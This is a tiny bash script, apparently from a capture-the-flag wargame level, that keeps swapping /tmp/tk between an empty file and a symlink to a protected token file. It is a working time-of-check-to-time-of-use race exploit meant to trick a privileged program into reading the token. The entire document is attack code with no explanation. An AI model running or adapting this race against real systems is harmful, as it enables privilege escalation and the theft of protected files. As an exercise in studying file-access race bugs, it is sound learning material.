#!/bin/bash

while true; do
        touch /tmp/tk
        rm -f /tmp/tk
        ln -s /home/user/level10/token /tmp/tk
        rm -f /tmp/tk
done
